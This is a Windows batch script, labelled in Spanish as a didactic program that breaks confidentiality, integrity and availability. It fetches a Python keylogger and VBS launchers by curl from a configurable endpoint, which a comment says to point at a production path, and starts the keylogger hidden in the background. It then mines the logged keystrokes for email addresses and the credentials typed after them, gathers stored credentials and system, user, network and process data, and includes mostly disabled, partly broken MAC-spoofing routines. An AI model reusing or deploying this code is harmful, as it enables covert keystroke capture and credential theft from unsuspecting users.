
echo **************************** PROGRAMA INFORMATICO DIDÁCTICO QUE VULNERA LA CIA ( Confidentiality, Integrity, Availability) **************************** >> salida.txt
setlocal enabledelayedexpansion

:: Simulación de try-catch
set "ErrorCode=0"
set "myHostName=%COMPUTERNAME%"

set "EndPoint=http://localhost:3000/KeyLoggerApp/"

:: Try Block

echo **************************** COMANDOS QUE VULNERAR LA CONFIDENCIALIDAD **************************** >> salida.txt
    call :GetKeyloggerInfo || set "ErrorCode=1"
    call :GetCredentials || echo  FALLO LA OBTENCIÓN DE CREDENCIALES MEDIANTE KEYLOGGER>> salida.txt 
    call :GetSystemInfo || set "ErrorCode=1"
    call :GetUserInfo || set "ErrorCode=1"

echo **************************** COMANDOS QUE VULNERAN LA DISPONIBILIDAD **************************** >> salida.txt

    call :GetNetworkInfo || set "ErrorCode=1"
    call :GetProcessInfo || set "ErrorCode=1"

echo **************************** COMANDOS QUE VULNERAN LA INTEGRIDAD **************************** >> salida.txt

    call :GetHardwareInformation || set "ErrorCode=1" 
    call :GetDriversInfo || set "ErrorCode=1"
    ::call :SimulateSpoofing || set "ErrorCode=1"
    ::call :SetDisponibility || set "ErrorCode=1"

:: Check for errors
if "%ErrorCode%" NEQ "0" (
    call :ErrorHandler
) else (
    :: Renombrar archivo de salida si no hubo errores
    ren salida.txt %myHostName%_salida.txt
)

endlocal
exit /b

:ErrorHandler
echo Ha ocurrido un error durante la ejecución del script. >> salida.txt
echo Código de Error: %ErrorCode% >> salida.txt
exit /b



:: Funciones

:GetSystemInfo
        echo **************************** INFORMACION DEL SISTEMA **************************** >> salida.txt
        hostname >> salida.txt
        systeminfo >> salida.txt
        nbtstat -n >> salida.txt
        netsh trace show providers >> salida.txt
        echo ************************************************************************************* >> salida.txt    
    exit /b

:GetUserInfo
    echo **************************** INFORMACION DE LOS USUARIOS **************************** >> salida.txt
    whoami /all >> salida.txt
    net localgroup >> salida.txt
    cmdkey /list >> salida.txt
    net accounts >> salida.txt
    echo ************************************************************************************* >> salida.txt
    exit /b

:GetNetworkInfo
    echo **************************** INFORMACION DE LA RED **************************** >> salida.txt
    ipconfig /all >> salida.txt
    netstat -ano >> salida.txt
    netsh interface ip show config >> salida.txt
    echo ************************************************************************************* >> salida.txt
    exit /b

:GetProcessInfo
    echo **************************** INFORMACION DE LOS PROCESOS **************************** >> salida.txt
    tasklist >> salida.txt
    echo ************************************************************************************* >> salida.txt
    exit /b

:GetDriversInfo

    echo **************************** INFORMACION DE LOS DRIVERS **************************** >> salida.txt    
    driverquery >> salida.txt
    echo ************************************************************************************* >> salida.txt
    exit /b

:GetKeyloggerInfo
    echo **************************** INFORMACIÓN DE keystrokes DE TECLADO **************************** >> salida.txt
    mkdir keyloggerLogs
    
    :: change path with production path   
    curl -o keyLogger.py %EndPoint%/keyLogger.py
    curl -o ExtractAfterEmail.vbs %EndPoint%/ExtractAfterEmail.vbs
    curl -o setup.vbs %EndPoint%/setup.vbs
    curl -o requirements.txt %EndPoint%/requirements.txt

    start "" wscript //B //Nologo "setup.vbs" 
    echo El keylogger está corriendo en segundo plano. >> salida.txt
    echo ************************************************************************************* >> salida.txt
    exit /b

:GetCredentials
    echo **************************** INFORMACIÓN PARA CONSEGUIR CREDENCIALES **************************** >> salida.txt
    :: crea archivo passwords.txt dentro de directorio keyloggerLogs

    echo. > keyloggerLogs\passwords.txt
    move keystrokes.txt keyloggerLogs

    netstat -n > ips.txt
    setlocal enabledelayedexpansion

    for /f "tokens=3" %%a in ('findstr /R "^[TCP]*" ips.txt') do (
        echo Resolviendo %%a...
        nslookup %%a 1>>temp_trace.txt 2>nul
    )
    echo Proceso completado. Revisa el archivo temp_trace.txt

    findstr /R "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" keyloggerLogs\keystrokes.txt >> keyloggerLogs\mails.txt

    wscript ExtractAfterEmail.vbs
    type temp_trace.txt >> keyloggerLogs\httpRequests.txt

    echo ************************************************************************************* >> salida.txt
    exit /b

:SimulateSpoofing
    echo **************************** SIMULACION DE ATAQUE DE SPOOFING **************************** >> salida.txt
    GETMAC >> salida.txt
    ARP -a >> salida.txt

    SETLOCAL
    SET PullHost=ARP -a
    SETLOCAL ENABLEDELAYEDEXPANSION
    set "IP="
    set "MASK="
    set "isWirelessAdapter=0"
    set "NETWORK="
    set "poolHost="

    echo **************************** Calcula la Ip host y la mascara para obtener la ip de la red *************************** >> salida.txt

    FOR /F "tokens=*" %%A IN ('ipconfig /all') DO (
        SET "InfNetwork=%%A"
        CALL :ProcessLine
    )

    CALL :CalculateNetwork %IP% %MASK%

    ECHO Dirección IP: %IP% >> salida.txt
    ECHO Máscara de subred: %MASK% >> salida.txt
    ECHO Dirección de red: %NETWORK% >> salida.txt

    exit /b

:SetDisponibility
    
    netsh interface set interface "Ethernet" admin=disable
    netsh interface set interface "Ethernet" admin=enable
    echo ************************************************************************************* >> salida.txt
    


:GetHardwareInformation
        if exist %windir%\System32\wbem\wmic.exe (
            wmic os get Caption,CSDVersion,OSArchitecture,Version /value >> salida.txt
            wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors /value >> salida.txt
            wmic memorychip get BankLabel,Capacity,MemoryType,TypeDetail,Speed /value >> salida.txt
            wmic computersystem get Manufacturer,Model,Name,NumberOfProcessors,PrimaryOwnerName,TotalPhysicalMemory /value >> salida.txt
        ) else (
            echo El comando wmic no está disponible en esta versión de Windows. >> salida.txt
        )

        exit /b

:: Funciones auxiliares

:ProcessLine
    IF "!InfNetwork!" NEQ "" (
        ECHO !InfNetwork! | findstr /R /C:"Adaptador.*LAN.*inalámbrica.*wi-fi" >nul && (
            SET "isWirelessAdapter=1"
        )
        IF "!isWirelessAdapter!" EQU "1" (
            ECHO !InfNetwork! | findstr /R /C:"Dirección.*IPv4" >nul && (
                FOR /F "tokens=2 delims=:" %%B IN ("!InfNetwork!") DO SET "IP=%%B"
                SET "IP=!IP: =!"
            )
            ECHO !InfNetwork! | findstr /R /C:"Máscara.*subred" >nul && (
                FOR /F "tokens=2 delims=:" %%B IN ("!InfNetwork!") DO SET "MASK=%%B"
                SET "MASK=!MASK: =!"
            )
        )
        ECHO !InfNetwork! | findstr /R /C:"Adaptador.*Ethernet" >nul && (
            SET "isWirelessAdapter=0"
        )
    )
EXIT /B

:CalculateNetwork
    setlocal
    set "IP=%1"
    set "MASK=%2"

    CALL :IpToBinary %IP% IP_BIN
    CALL :IpToBinary %MASK% MASK_BIN

    set "NETWORK_BIN="
    for /L %%i in (0,1,31) do (
        set /A "bit=!IP_BIN:~%%i,1! & !MASK_BIN:~%%i,1!"
        set "NETWORK_BIN=!NETWORK_BIN!!bit!"
    )

    CALL :BinaryToIp %NETWORK_BIN% NETWORK

    endlocal & set "NETWORK=%NETWORK%"
    exit /b

:IpToBinary
    setlocal
    set "IP=%1"
    set "IP_BIN="
    for %%i in (%IP:.= %) do (
        set /A "octet=%%i"
        set "bin=00000000!octet:~0,8!"
        set "IP_BIN=!IP_BIN!!bin:~-8!"
    )
    endlocal & set "%2=%IP_BIN%"
    exit /b

:BinaryToIp
    setlocal
    set "BIN=%1"
    set "IP="
    for /L %%i in (0,8,24) do (
        set /A "octet=0b!BIN:~%%i,8!"
        set "IP=!IP!!octet!."
    )
    set "IP=%IP:~0,-1%"
    endlocal & set "%2=%IP%"
    exit /b

:GetPoolHostNetwork
    setlocal enabledelayedexpansion
    :ObtenerIPsYMACs
        set "index=0"
        FOR /F "tokens=1,2,3 delims= " %%A IN ('%PullHost%') DO (
            IF "%%A" NEQ "Interfaz:" (
                IF "%%B" NEQ "" (
                    set "poolHost[!index!]=%%A"
                    set "poolMAC[!index!]=%%B"
                    set /A index+=1
                )
            )
        )
        exit /b

    :CrearArregloGeneral
        set "index=0"
        for /L %%i in (0,1,%index%) do (
            set "ip=!poolHost[%%i]!"
            set "mac=!poolMAC[%%i]!"
            set "arregloGeneral[!ip!]=!mac!"
        )
        exit /b

    :ValidarIPs
        set "index=0"
        for /L %%i in (0,1,%index%) do (
            set "ip=!poolHost[%%i]!"
            call :CalculateNetwork !ip! %MASK%
            if "!NETWORK!" EQU "%NETWORK%" (
                set "salida[!index!]=!ip! !poolMAC[%%i]!"
                set /A index+=1
            )
        )
        exit /b

    call :ObtenerIPsYMACs
    call :CrearArregloGeneral
    call :ValidarIPs

    for /L %%i in (0,1,%index%) do (
        echo Lista de ips y Macs pertenecientes a la red: >> salida.txt
        echo !salida[%%i]! >> salida.txt
    )

    exit /b

:SpoofingMAC
    setlocal enabledelayedexpansion

    :GetOwnIP
        for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /c:"Dirección IPv4"') do (
            for /f "tokens=1 delims= " %%j in ("%%i") do (
                set "ownIP=%%j"
            )
        )
        exit /b

    :CambiarMAC
        set "interface=Ethernet"
        set "newMAC=%1"
        netsh interface set interface name="%interface%" newmac="%newMAC%"
        exit /b

    :SpoofingMAC
        call :GetOwnIP

        set "found=0"
        for /L %%i in (0,1,%index%) do (
            set "elemento=!salida[%%i]!"
            for /F "tokens=1,2 delims= " %%A in ("!elemento!") do (
                if "%%A" NEQ "!ownIP!" (
                    set "macParaSpoofing=%%B"
                    set "found=1"
                    goto :SpoofingMAC_Found
                )
            )
        )

    :SpoofingMAC_Found
        if "!found!" EQU "1" (
            call :CambiarMAC %macParaSpoofing%
        ) else (
            echo No se encontró una IP diferente a la propia en el arreglo salida.
        )
        exit /b

    call :SpoofingMAC
    exit /b

:DisableMacSpoofing
    netsh interface set interface "Ethernet" admin=disable
    netsh interface set interface "Ethernet" admin=enable
    echo Dirección MAC cambiada temporalmente para simular spoofing >> salida.txt
    echo ************************************************************************************* >> salida.txt
    exit /b
